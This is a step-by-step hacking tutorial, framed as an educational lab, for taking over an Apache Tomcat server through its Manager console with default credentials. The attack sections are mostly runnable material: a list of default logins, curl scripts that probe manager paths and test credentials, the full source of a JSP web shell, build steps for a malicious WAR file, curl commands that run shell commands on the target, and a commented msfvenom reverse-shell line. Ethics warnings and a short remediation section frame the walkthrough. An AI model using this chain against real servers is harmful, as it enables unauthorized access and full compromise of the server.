# Default Tomcat Credentials to RCE

**🔴🔴🔴 WARNING: ETHICAL USE AND LEGAL COMPLIANCE REQUIRED 🔴🔴🔴**

This document provides a detailed walkthrough for educational purposes, simulating a scenario where an Apache Tomcat server is found running with default or easily guessable credentials for its Manager Application. This access is then leveraged to deploy a malicious WAR file, achieving Remote Code Execution (RCE) on the server.

**YOU MUST ONLY APPLY THESE TECHNIQUES TO:**
1.  **Systems you OWN and have built for testing.**
2.  **Intentionally vulnerable applications/servers in a controlled lab environment.**
3.  **Targets for which you have EXPLICIT, WRITTEN PERMISSION from the owner (e.g., official bug bounty programs, within defined scope).**

**UNAUTHORIZED ACCESS OR TESTING IS ILLEGAL AND UNETHICAL. YOU ARE RESPONSIBLE FOR YOUR ACTIONS.**

---

## Table of Contents
1.  [Objective & Scenario Overview](#1-objective--scenario-overview)
2.  [Prerequisites & Lab Setup (Conceptual)](#2-prerequisites--lab-setup-conceptual)
3.  [Phase 1: Reconnaissance & Discovery](#3-phase-1-reconnaissance--discovery)
    *   [3.1. Initial Target Identification (Tomcat Server)](#31-initial-target-identification-tomcat-server)
    *   [3.2. Initial Directory Brute-forcing (Simulated Failure)](#32-initial-directory-brute-forcing-simulated-failure)
    *   [3.3. OSINT - Using Shodan (Conceptual for Lab)](#33-osint---using-shodan-conceptual-for-lab)
    *   [3.4. Identifying Tomcat Manager on an Alternate Port](#34-identifying-tomcat-manager-on-an-alternate-port)
4.  [Phase 2: Exploiting Default Credentials](#4-phase-2-exploiting-default-credentials)
    *   [4.1. Accessing Tomcat Manager Login Prompt](#41-accessing-tomcat-manager-login-prompt)
    *   [4.2. Testing Default/Common Tomcat Credentials](#42-testing-defaultcommon-tomcat-credentials)
    *   [4.3. Gaining Access to Tomcat Manager Console](#43-gaining-access-to-tomcat-manager-console)
5.  [Phase 3: Achieving RCE via WAR File Upload](#5-phase-3-achieving-rce-via-war-file-upload)
    *   [5.1. Understanding WAR File Deployment in Tomcat Manager](#51-understanding-war-file-deployment-in-tomcat-manager)
    *   [5.2. Creating a Malicious WAR File (with a JSP Web Shell)](#52-creating-a-malicious-war-file-with-a-jsp-web-shell)
    *   [5.3. Uploading and Deploying the Malicious WAR File](#53-uploading-and-deploying-the-malicious-war-file)
    *   [5.4. Accessing the Web Shell and Executing Commands](#54-accessing-the-web-shell-and-executing-commands)
6.  [Phase 4: Impact & Ethical Reporting](#6-phase-4-impact--ethical-reporting)
7.  [Remediation & Prevention Strategies](#7-remediation--prevention-strategies)
8.  [Conclusion](#8-conclusion)

---

## 1. Objective & Scenario Overview

*   **Objective:** To simulate and understand how weak or default credentials on a web server management interface (specifically Apache Tomcat Manager) can be exploited to gain administrative access and subsequently achieve Remote Code Execution (RCE) by deploying a malicious application.
*   **Scenario Simulated:**
    1.  An Apache Tomcat server is identified.
    2.  Initial attempts to find common vulnerabilities (like exposed directories) fail.
    3.  OSINT (simulated via Shodan lookup concepts) reveals a Tomcat instance running on a non-standard port (e.g., 8082).
    4.  The Tomcat Manager application is found on this instance (`/manager`).
    5.  Default credentials (e.g., `tomcat:s3cret` or `admin:admin`) grant access to the Manager console.
    6.  A malicious WAR (Web Application Archive) file containing a JSP web shell is crafted.
    7.  This WAR file is uploaded and deployed via the Tomcat Manager.
    8.  The deployed web shell is accessed, allowing arbitrary commands to be executed on the server.
*   **Ethical Context:** This entire process is to be performed **only on authorized targets in a lab environment.**

---

## 2. Prerequisites & Lab Setup (Conceptual)

To simulate this in a lab:

*   **Target Tomcat Server (Lab Environment):**
    *   Install Apache Tomcat (e.g., version 7, 8, or 9). You can download it from the official Apache Tomcat website.
    *   **Crucially:** During setup, or by editing `tomcat-users.xml` (located in `CATALINA_HOME/conf/`), configure a manager user with default or weak, easily guessable credentials.
        *   Example `tomcat-users.xml` entry:
            ```xml
            <role rolename="manager-gui"/>
            <role rolename="manager-script"/> <!-- Optional but often present -->
            <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
            <!-- Or try other defaults like admin:admin, tomcat:tomcat -->
            ```
    *   Ensure the Tomcat Manager application is deployed (it usually is by default).
    *   For the scenario, configure Tomcat to listen on a non-standard port like `8082` in addition to or instead of `8080`. This can be done by editing `server.xml` in `CATALINA_HOME/conf/` (modify the `<Connector port="8080" ...>` element or add a new one for `8082`).
*   **Tools Environment:**
    *   Web Browser.
    *   `curl`.
    *   A tool to create WAR files (`jar` command from JDK, or build tools like Maven/Gradle if you're creating a more complex shell).
    *   Text editor.
    *   Optionally, a directory fuzzer (`ffuf`, `gobuster`) for the initial (failed) attempt.
    *   Shodan CLI or website access (for conceptual understanding; direct Shodan use is for public IPs).
*   **Placeholders for this Guide:**
    ```bash
    # In your notes or a shell script for convenience
    # Assume your lab Tomcat server's IP is 192.168.1.100 (REPLACE THIS)
    export TARGET_IP="192.168.1.100" # !!! REPLACE with your Tomcat lab server IP !!!
    export TOMCAT_ALT_PORT="8082"    # The non-standard port Tomcat is also listening on
    export TOMCAT_MANAGER_PATH="/manager/html" # Standard path to HTML manager (sometimes just /manager)
    
    # Default credentials to try (based on scenario)
    export DEFAULT_USER="tomcat"
    export DEFAULT_PASS="s3cret" 
    # Other common defaults: admin:admin, tomcat:tomcat, admin: (blank pass), root:root (less common for tomcat manager)
    ```

---

## 3. Phase 1: Reconnaissance & Discovery

### 3.1. Initial Target Identification (Tomcat Server)

*   **Action:** In a real scenario, you'd identify a target running Tomcat through various means (nmap scans showing port 8080 open with Tomcat signature, HTTP headers, error pages). In our lab, we know `{$TARGET_IP}` is our Tomcat server.

### 3.2. Initial Directory Brute-forcing (Simulated Failure)

The scenario mentions: "The first thing I did was brute forcing tomcat directories, but unfortunately, it did not work."

*   **Action (Simulated):** Run `ffuf` or `gobuster` against `http://{$TARGET_IP}:8080` (standard port) to find common Tomcat paths.
*   **Code (Conceptual Shell - ffuf):**
    ```bash
    # WORDLIST_PATH="${HOME}/SecLists/Discovery/Web-Content/tomcat.txt" # Specific Tomcat wordlist
    # if [ -z "${TARGET_IP}" ] || [ -z "${WORDLIST_PATH}" ]; then echo "[ERROR] Required vars not set."; exit 1; fi
    # if [ ! -f "${WORDLIST_PATH}" ]; then echo "[ERROR] Wordlist ${WORDLIST_PATH} not found."; exit 1; fi
    
    # echo "[INFO] Fuzzing directories on http://${TARGET_IP}:8080 ..."
    # ffuf -w "${WORDLIST_PATH}" -u "http://${TARGET_IP}:8080/FUZZ" -mc 200,301,302,401,403 -fc 404 -t 50 -c
    ```
*   **Outcome for Scenario:** This initial fuzzing on the standard port does not yield immediate exploitable results like an exposed Manager app (or it's properly secured on this port).

### 3.3. OSINT - Using Shodan (Conceptual for Lab)

"that’s where I decided to visit Shodan." Shodan.io is a search engine for internet-connected devices.

*   **Action (Conceptual for Lab):**
    *   In a real scenario with a public IP, you'd search Shodan for:
        *   `ip:"X.X.X.X"` (the target's public IP)
        *   `product:"Apache Tomcat/Coyote JSP engine"` hostname:`target.com`
        *   `port:"8080" http.component:"tomcat"`
    *   **For our lab:** We *simulate* Shodan's finding by "knowing" our Tomcat server is also on port `{$TOMCAT_ALT_PORT}`. Shodan often reveals services on non-standard ports.
*   **Scenario Outcome:** "I saw some application running on port 8082 and it was using tomcat."

### 3.4. Identifying Tomcat Manager on an Alternate Port

*   **Action:** Based on the (simulated) Shodan finding, investigate `http://{$TARGET_IP}:{$TOMCAT_ALT_PORT}`.
    *   Browse to it.
    *   Try common Tomcat Manager paths: `/manager/html`, `/manager/status`, `/host-manager/html`.
*   **Code (Conceptual `curl` to check common manager paths on the alternate port):**
    ```bash
    # Ensure TARGET_IP and TOMCAT_ALT_PORT are set
    MANAGER_PATHS=("/manager/html" "/manager" "/host-manager/html" "/manager/status")
    BASE_URL_ALT_PORT="http://${TARGET_IP}:${TOMCAT_ALT_PORT}"

    echo "[INFO] Checking for Tomcat Manager on ${BASE_URL_ALT_PORT}..."
    for path in "${MANAGER_PATHS[@]}"; do
        FULL_URL="${BASE_URL_ALT_PORT}${path}"
        echo -n "[TRYING] ${FULL_URL} ... "
        http_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "${FULL_URL}")
        if [ "$http_code" = "401" ] || [ "$http_code" = "403" ]; then # Prompts for auth
            echo -e "\033[0;32mFOUND (Auth Prompt - ${http_code})\033[0m - Likely Tomcat Manager!"
            export TOMCAT_MANAGER_URL="${FULL_URL}" # Save the found URL
            break # Found one, stop checking
        elif [ "$http_code" = "200" ]; then # Sometimes status page is public
             echo -e "\033[0;33mFOUND (200 OK)\033[0m - Might be manager status or public page."
        else
            echo "Status: ${http_code}"
        fi
    done

    if [ -z "${TOMCAT_MANAGER_URL}" ]; then
        echo "[WARN] No clear Tomcat Manager login prompt found on alternate port via common paths."
        # If the scenario specified the path directly:
        export TOMCAT_MANAGER_URL="http://${TARGET_IP}:${TOMCAT_ALT_PORT}/manager" # As per scenario
        echo "[INFO] Using scenario specified manager URL: ${TOMCAT_MANAGER_URL}"
    else
        echo "[CONFIRMED] Tomcat Manager URL set to: ${TOMCAT_MANAGER_URL}"
    fi
    ```
*   **Scenario Outcome:** "I tried accessing `http://x.x.x.x:8082/manager` and guess what, it was prompting me to enter username and password." (Note: Often `/manager/html` is the GUI, `/manager` might redirect or be for script access). For simplicity, we'll assume `/manager` leads to the GUI prompt in this lab.

---

## 4. Phase 2: Exploiting Default Credentials

### 4.1. Accessing Tomcat Manager Login Prompt
*   **Action:** Open `{$TOMCAT_MANAGER_URL}` (e.g., `http://{$TARGET_IP}:{$TOMCAT_ALT_PORT}/manager/html`) in your browser. You should see an HTTP Basic Authentication prompt.

### 4.2. Testing Default/Common Tomcat Credentials
*   **Action:** Try known default credentials.
*   **Common Tomcat Default/Weak Credentials:**
    *   `tomcat:s3cret` (as per scenario)
    *   `tomcat:tomcat`
    *   `admin:admin`
    *   `admin: ` (blank password)
    *   `manager:manager`
    *   `role1:role1`
    *   `both:both`
*   **Code (Conceptual `curl` to test one set of credentials):**
    ```bash
    # Ensure TOMCAT_MANAGER_URL, DEFAULT_USER, DEFAULT_PASS are set
    echo "[INFO] Attempting login to ${TOMCAT_MANAGER_URL} with ${DEFAULT_USER}:[REDACTED]"
    
    # -I to get headers, -s for silent, -L to follow redirects
    # The status code for successful basic auth is 200. Failure is 401.
    http_status_auth_attempt=$(curl -s -L -o /dev/null -w "%{http_code}" \
        -u "${DEFAULT_USER}:${DEFAULT_PASS}" \
        "${TOMCAT_MANAGER_URL}")

    if [ "${http_status_auth_attempt}" = "200" ]; then
        echo -e "\033[0;32m[SUCCESS!] Credentials ${DEFAULT_USER}:${DEFAULT_PASS} WORKED! (Status: 200 OK)\033[0m"
    else
        echo -e "\033[0;31m[FAILURE] Credentials ${DEFAULT_USER}:${DEFAULT_PASS} failed (Status: ${http_status_auth_attempt})\033[0m"
    fi
    ```
    *   **To iterate through a list of credentials (Brute force - be careful):**
        You could create a file `tomcat_creds.txt` with `user:pass` per line and loop through it.
        **Warning:** Brute-forcing can lock out accounts or trigger alerts. Use with extreme caution and only on authorized systems. For this lab, we assume the first try (`tomcat:s3cret`) works.

### 4.3. Gaining Access to Tomcat Manager Console
*   **Scenario Outcome:** "BOOM!!!!!, The username=tomcat and password=s3cret worked and the Tomcat Application Manager Console was accessible."
*   **Action:** After successful authentication in the browser, you will see the Tomcat Web Application Manager page. This page allows you to deploy, undeploy, start, and stop web applications.

---

## 5. Phase 3: Achieving RCE via WAR File Upload

"I should have stopped but I knew, I can get a remote code execution by uploading malicious war file."

### 5.1. Understanding WAR File Deployment in Tomcat Manager
The Tomcat Manager allows administrators to deploy WAR (Web Application Archive) files. A WAR file is essentially a ZIP file containing a web application (JSPs, servlets, HTML, etc.). If you can upload a WAR file, you can deploy your own application, including a web shell.

### 5.2. Creating a Malicious WAR File (with a JSP Web Shell)

*   **Action:** Create a simple JSP web shell and package it into a WAR file.
*   **Step 1: Create the JSP Web Shell (`shell.jsp`):**
    ```jsp
    <%-- shell.jsp --%>
    <%@ page import="java.util.*,java.io.*"%>
    <%
        if (request.getParameter("cmd") != null) {
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
            }
        }
    %>
    <form method="GET" action="shell.jsp">
        <input type="text" name="cmd" size="50">
        <input type="submit" value="Run Command">
    </form>
    ```
    A simpler one for quick test:
    ```jsp
    <%-- test.jsp --%>
    <HTML><BODY>
    Hello! JSP is working. System time: <%= new java.util.Date() %>
    </BODY></HTML>
    ```
*   **Step 2: Package into a WAR file (`evil.war`):**
    You need the `jar` command (part of the Java Development Kit - JDK).
    ```bash
    # Create a temporary directory structure for the WAR
    mkdir -p evil_app/WEB-INF
    # Put your shell.jsp into the root of evil_app
    echo '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %><form method="GET" action="shell.jsp"><input type="text" name="cmd" size="50"><input type="submit" value="Run Command"></form>' > evil_app/shell.jsp
    
    # You might need a minimal web.xml in WEB-INF, though for simple JSPs Tomcat often doesn't strictly require it.
    # Create WEB-INF/web.xml (optional for simple shell, but good practice)
    # echo '<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" version="3.1"><display-name>EvilApp</display-name></web-app>' > evil_app/WEB-INF/web.xml

    echo "[INFO] Creating evil.war file..."
    # From inside the evil_app directory: jar -cvf ../evil.war .
    # Or from one level above:
    (cd evil_app && jar -cvf ../evil.war .) # The '.' means all files in current dir (evil_app)

    if [ -f "evil.war" ]; then
        echo "[SUCCESS] evil.war created successfully."
    else
        echo "[ERROR] Failed to create evil.war. Ensure JDK (jar command) is installed and paths are correct."
        # Consider using msfvenom for more robust shells:
        # msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f war -o msf_shell.war
        # (You'd need Metasploit Framework and a listener for reverse shell)
    fi
    # Cleanup temporary directory
    rm -rf evil_app
    ```

### 5.3. Uploading and Deploying the Malicious WAR File

*   **Action:** Use the Tomcat Manager GUI.
    1.  Navigate to the "WAR file to deploy" section (or "Deploy directory or WAR file located on server").
    2.  Click "Browse..." or "Choose File", select your `evil.war`.
    3.  Click "Deploy".
*   **Scenario Outcome:** "I navigated to “Select WAR file to upload” section and uploaded it."
*   **Tomcat Manager Behavior:** When you deploy `evil.war`, Tomcat will typically deploy it to a context path named `/evil` (derived from the WAR filename).

### 5.4. Accessing the Web Shell and Executing Commands

*   **Action:**
    1.  After successful deployment, the Tomcat Manager will list `/evil` as one of the deployed applications.
    2.  Access your web shell by navigating to: `http://{$TARGET_IP}:{$TOMCAT_ALT_PORT}/evil/shell.jsp`
    3.  You should see the form with an input box.
*   **Executing Commands:**
    *   Enter a command (e.g., `whoami`, `ls -la` on Linux, `cmd /c dir` on Windows) into the input box and click "Run Command".
    *   Or directly in the URL: `http://{$TARGET_IP}:{$TOMCAT_ALT_PORT}/evil/shell.jsp?cmd=whoami`
*   **Code (Conceptual `curl` to test the deployed shell):**
    ```bash
    # Ensure TARGET_IP, TOMCAT_ALT_PORT are set
    # Assumes the WAR was deployed as /evil and shell is shell.jsp
    SHELL_URL="http://${TARGET_IP}:${TOMCAT_ALT_PORT}/evil/shell.jsp"

    echo "[INFO] Attempting to execute 'whoami' command via web shell at ${SHELL_URL}"
    # URL encode commands if they have spaces or special chars, though for simple ones it might work.
    # For 'ls -la /tmp': cmd=ls%20-la%20%2Ftmp
    COMMAND_TO_RUN="whoami" # Basic command
    COMMAND_TO_RUN_URL_ENCODED=$(printf %s "${COMMAND_TO_RUN}" | jq -s -R -r @uri) # Requires jq for URL encoding

    # Send command via GET request
    curl -s -L -k "${SHELL_URL}?cmd=${COMMAND_TO_RUN_URL_ENCODED}"

    echo -e "\n\n[INFO] Attempting to execute 'id' command..."
    COMMAND_TO_RUN_2="id"
    COMMAND_TO_RUN_2_URL_ENCODED=$(printf %s "${COMMAND_TO_RUN_2}" | jq -s -R -r @uri)
    curl -s -L -k "${SHELL_URL}?cmd=${COMMAND_TO_RUN_2_URL_ENCODED}"
    ```
*   **Scenario Outcome:** "The webshell was successfully uploaded and I was able to run a few commands on it." This confirms RCE.

---

## 6. Phase 4: Impact & Ethical Reporting

If this were an authorized test:

*   **Impact:**
    *   **Full Server Compromise:** RCE means the attacker has control over the underlying server with the privileges of the Tomcat service user.
    *   Data theft, modification, or deletion.
    *   Installation of persistent backdoors, malware, crypto miners.
    *   Pivoting to other internal network systems.
    *   Denial of Service.
*   **Documentation:**
    *   IP and Port of the Tomcat server: `{$TARGET_IP}:{$TOMCAT_ALT_PORT}`.
    *   Tomcat Manager URL: `{$TOMCAT_MANAGER_URL}`.
    *   Default credentials used: `{$DEFAULT_USER}:{$DEFAULT_PASS}`.
    *   Steps to create and deploy the malicious WAR file.
    *   URL of the web shell: `{$SHELL_URL}`.
    *   Examples of commands executed and their output.
    *   Screenshots.
*   **Report Immediately:** This is a critical vulnerability.

---

## 7. Remediation & Prevention Strategies

*   **Change Default Credentials:** This is the **MOST CRITICAL** fix. Immediately change the default passwords for all Tomcat manager roles (and any other default accounts on any system). Use strong, unique passwords.
*   **Restrict Access to Tomcat Manager:**
    *   **Network Segmentation/Firewall:** The Tomcat Manager application should NOT be accessible from the public internet. Restrict access to trusted internal IPs or a management VPN.
    *   **Tomcat `RemoteAddrValve`:** Configure Tomcat's `context.xml` for the Manager app to allow access only from specific IP addresses. Example for `manager/META-INF/context.xml`:
        ```xml
        <Context antiResourceLocking="false" privileged="true">
          <Valve className="org.apache.catalina.valves.RemoteAddrValve"
                 allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1|192\.168\.1\.\d{1,3}"/>
          <!-- allow="YOUR_TRUSTED_ADMIN_IP_REGEX_HERE" -->
        </Context>
        ```
*   **Remove Unused Manager Apps:** If the Tomcat Manager application (or Host Manager) is not needed in production, undeploy it.
*   **Principle of Least Privilege:** The Tomcat service itself should run with the minimum necessary privileges on the operating system.
*   **Regularly Update Tomcat:** Keep Tomcat and the underlying Java JRE/JDK patched for known vulnerabilities.
*   **Web Application Firewall (WAF):** A WAF might help detect or block attempts to access common management paths or upload suspicious files, but it's not a substitute for proper configuration.
*   **Security Audits & Penetration Testing:** Regularly test for default credentials and other misconfigurations.

---

## 8. Conclusion

This educational simulation demonstrates a straightforward yet highly impactful attack path: exploiting default credentials on a management interface (Tomcat Manager) to achieve Remote Code Execution. It underscores the paramount importance of changing default credentials on all systems and services, and properly securing management interfaces. Even with OSINT tools like Shodan making discovery easier, the root cause is often a basic configuration oversight.

**Always practice ethical hacking responsibly and within legal boundaries. Understanding such direct RCE vectors is crucial for system administrators and security professionals.**

---
**Follow @muneebwanee for more Hacking Tutorials**
